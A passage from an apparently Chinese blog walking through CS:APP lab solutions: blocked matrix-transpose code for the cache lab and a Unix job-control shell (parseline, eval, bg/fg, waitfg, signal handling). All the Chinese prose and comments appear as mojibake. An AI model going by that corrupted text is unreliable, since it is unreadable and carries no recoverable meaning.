class="hljs-number">4</span>][y]; x2 = A[i+<span class="hljs-number">5</span>][y]; x3 = A[i+<span class="hljs-number">6</span>][y]; x4 = A[i+<span class="hljs-number">7</span>][y];<br>x5 = B[y][i+<span class="hljs-number">4</span>]; x6 = B[y][i+<span class="hljs-number">5</span>]; x7 = B[y][i+<span class="hljs-number">6</span>]; x8 = B[y][i+<span class="hljs-number">7</span>];<br><br>B[y][i+<span class="hljs-number">4</span>] = x1; B[y][i+<span class="hljs-number">5</span>] = x2; B[y][i+<span class="hljs-number">6</span>] = x3; B[y][i+<span class="hljs-number">7</span>] = x4;<br>B[y+<span class="hljs-number">4</span>][i] = x5; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>] = x6; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>] = x7; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (x = i + <span class="hljs-number">4</span>; x &lt; i + <span class="hljs-number">8</span>; ++x)<br>&#123;<br>x1 = A[x][j+<span class="hljs-number">4</span>]; x2 = A[x][j+<span class="hljs-number">5</span>]; x3 = A[x][j+<span class="hljs-number">6</span>]; x4 = A[x][j+<span class="hljs-number">7</span>];<br>B[j+<span class="hljs-number">4</span>][x] = x1; B[j+<span class="hljs-number">5</span>][x] = x2; B[j+<span class="hljs-number">6</span>][x] = x3; B[j+<span class="hljs-number">7</span>][x] = x4;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç¬¬äºŒç§è§£æ³•åœ¨é‚£ä¸ªé“¾æ¥é‡Œçš„è¯„è®ºåŒºé‡Œ1024æ¬¡miss, æœªçœ‹.</p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67:"></a>61*67:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">16</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; N; ++k)<br>        &#123;<br>            <span class="hljs-keyword">int</span> temp_position = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">int</span> temp_value = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">int</span> l;<br>            <span class="hljs-keyword">for</span> (l = j; l &lt; j + <span class="hljs-number">16</span> &amp;&amp; l &lt; M; ++l)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (l == k) <span class="hljs-comment">/* æ¨ªåæ ‡ç­‰äºçºµåæ ‡ï¼Œå±€éƒ¨å˜é‡æš‚å­˜ï¼Œæ•´ä¸ªblockè¯»å®Œå†å¤„ç† */</span><br>                &#123;<br>                    temp_position = k;<br>                    temp_value = A[k][k];<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (temp_position != <span class="hljs-number">-1</span>) <span class="hljs-comment">/* é‡åˆ°äº†å†²çªå…ƒç´  */</span> <br>            &#123;<br>                B[temp_position][temp_position] = temp_value;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="å…¶ä»–é“¾æ¥"><a href="#å…¶ä»–é“¾æ¥" class="headerlink" title="å…¶ä»–é“¾æ¥"></a>å…¶ä»–é“¾æ¥</h3><p>é™„ä¸Šæ‰‹ç®—missç‡çš„ç¥äºº<a href="https://zhuanlan.zhihu.com/p/28585726">ä¸“æ </a>. ä»¥åŠCMUçš„<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">è¯¾ä»¶</a>, missæ¬¡æ•°å¥½åƒå°±æ˜¯è¿™ä¸Šé¢çš„.</p><h2 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h2><h3 id="é€šè¿‡parselineç†è§£ä¸€ä¸‹å¦‚ä½•ç¼–å†™"><a href="#é€šè¿‡parselineç†è§£ä¸€ä¸‹å¦‚ä½•ç¼–å†™" class="headerlink" title="é€šè¿‡parselineç†è§£ä¸€ä¸‹å¦‚ä½•ç¼–å†™"></a>é€šè¿‡parselineç†è§£ä¸€ä¸‹å¦‚ä½•ç¼–å†™</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * parseline - Parse the command line and build the argv array.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Characters enclosed in single quotes are treated as a single</span><br><span class="hljs-comment"> * argument.  Return true if the user has requested a BG job, false if</span><br><span class="hljs-comment"> * the user has requested a FG job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span>  <span class="hljs-comment">// cmdline--&gt;argv_array</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> <span class="hljs-built_in">array</span>[MAXLINE]; <span class="hljs-comment">/* holds local copy of command line */</span><br>    <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">array</span>;          <span class="hljs-comment">/* ptr that *traverses* command line */</span><br>    <span class="hljs-keyword">char</span> *delim;                <span class="hljs-comment">/* points to first space delimiter */</span><br>    <span class="hljs-keyword">int</span> argc;                   <span class="hljs-comment">/* number of args */</span><br>    <span class="hljs-keyword">int</span> bg;                     <span class="hljs-comment">/* background job? */</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;  <span class="hljs-comment">/* replace trailing &#x27;\n&#x27; with space */</span><br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore leading spaces */</span><br>buf++;<br><br>    <span class="hljs-comment">/* Build the argv list */</span> <span class="hljs-comment">//è¿™é‡Œå·²ç»åˆ°äº†ç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦</span><br>    argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>buf++;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>); <span class="hljs-comment">//è¿™ä¸¤ä¸ªdelimæŒ‡æ˜çš„æ˜¯å½“å‰å‚æ•°åé¢çš„åˆ†éš”ç¬¦</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (delim) &#123;<br>argv[argc++] = buf;<br>*delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<span class="hljs-comment">//æˆªæ–­</span><br>buf = delim + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore spaces */</span><br>       buf++;<br><br><span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>    buf++;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br>    &#125;<br>    argv[argc] = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* ignore blank line */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* should the job run in the background? */</span><br>    <span class="hljs-keyword">if</span> ((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>) &#123;<br>argv[--argc] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bg;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-eval-å¤„ç†å‘½ä»¤è¡Œè¾“å…¥-cmdline"><a href="#1-eval-å¤„ç†å‘½ä»¤è¡Œè¾“å…¥-cmdline" class="headerlink" title="1.eval(): å¤„ç†å‘½ä»¤è¡Œè¾“å…¥(cmdline)"></a>1.<code>eval()</code>: å¤„ç†å‘½ä»¤è¡Œè¾“å…¥(cmdline)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">sigset_t</span> <span class="hljs-built_in">set</span>;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> state = UNDEF;<br>    <span class="hljs-keyword">char</span> *argv[MAXLINE];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == parseline(cmdline, argv))<br>        state = BG;<br>    <span class="hljs-keyword">else</span><br>        state = FG;<br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv))<br>    &#123;<br>        sigemptyset(&amp;<span class="hljs-built_in">set</span>);<br>        sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGINT), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGCHLD), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGSTOP);<br>        sigprocmask(SIG_BLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;fork error!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">//è¿›å…¥åˆ°äº†forkå‡ºæ¥çš„å­ç¨‹åº</span><br>        &#123;<br>            sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br>            setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//1.è·¯å¾„ 2.å‚æ•°ï¼ˆåŒ…æ‹¬1ï¼‰ 3.ç¯å¢ƒå˜é‡</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: commond not found!&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//forkå®Œæˆï¼Œ åŠ å…¥joblist</span><br>        addjob(jobs, pid, state, cmdline);<br>        <span class="hljs-keyword">if</span> (sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;sigprocmask error&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (state == FG)<br>            waitfg(pid);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-builtin-cmd-åˆ¤æ–­æ˜¯å¦å†…ç½®å‡½æ•°å¹¶è·³è½¬"><a href="#2-builtin-cmd-åˆ¤æ–­æ˜¯å¦å†…ç½®å‡½æ•°å¹¶è·³è½¬" class="headerlink" title="2.builtin_cmd()åˆ¤æ–­æ˜¯å¦å†…ç½®å‡½æ•°å¹¶è·³è½¬"></a>2.<code>builtin_cmd()</code>åˆ¤æ–­æ˜¯å¦å†…ç½®å‡½æ•°å¹¶è·³è½¬</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>        do_bgfg(argv);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>))<br>        listjobs(jobs);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* not a builtin command */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-do-bgfg-æ‰§è¡Œbg-fgå‘½ä»¤"><a href="#3-do-bgfg-æ‰§è¡Œbg-fgå‘½ä»¤" class="headerlink" title="3.do_bgfg()æ‰§è¡Œbg fgå‘½ä»¤"></a>3.<code>do_bgfg()</code>æ‰§è¡Œbg fgå‘½ä»¤</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> parsed;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-keyword">if</span> (!argv[<span class="hljs-number">1</span>])<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s commond requires PID or %%JID argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) <span class="hljs-comment">//é”™è¯¯æ£€æŸ¥ä»¥åŠå–å‡ºPIDæˆ–è€…JID</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobjid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such job\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobpid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//fgå’Œbgåˆ†åˆ«å¤„ç†</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>))<br>    &#123;<br>        job-&gt;state = BG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//å‘é€signalåˆ°groupidä¸º|job-&gt;pid|çš„ç»„</span><br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>    &#123;<br>        job-&gt;state = FG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        waitfg(job-&gt;pid);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do_bgfg: Internal error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-waitfg-ç­‰å¾…å‰å°ç¨‹åºç»“æŸ"><a href="#4-waitfg-ç­‰å¾…å‰å°ç¨‹åºç»“æŸ" class="headerlink" title="4.waitfg()ç­‰å¾…å‰å°ç¨‹åºç»“æŸ"></a>4.<code>waitfg()</code>ç­‰å¾…å‰å°ç¨‹åºç»“æŸ</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//ä½¿ç”¨sigsuspend</span><br>    <span class="hljs-keyword">sigset_t</span> sig, prev;<br>    sigemptyset(&amp;sig);<br>    sigaddset(&amp;sig, SIGCHLD);<br>    sigprocmask(SIG_BLOCK, &amp;sig, &amp;prev);<br>    <br>    <span class="hljs-keyword">while</span>(pid == fgpid(jobs))<br>        sigsuspend(&amp;prev);<br>    <br>    sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>(verbose)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-signal-handlers"><a href="#5-signal-handlers" class="headerlink" title="5.signal_handlers"></a>5.<code>signal_handlers</code></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*****************</span><br><span class="hljs-comment"> * Signal handlers</span><br><span class="hljs-comment"> *****************/</span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, 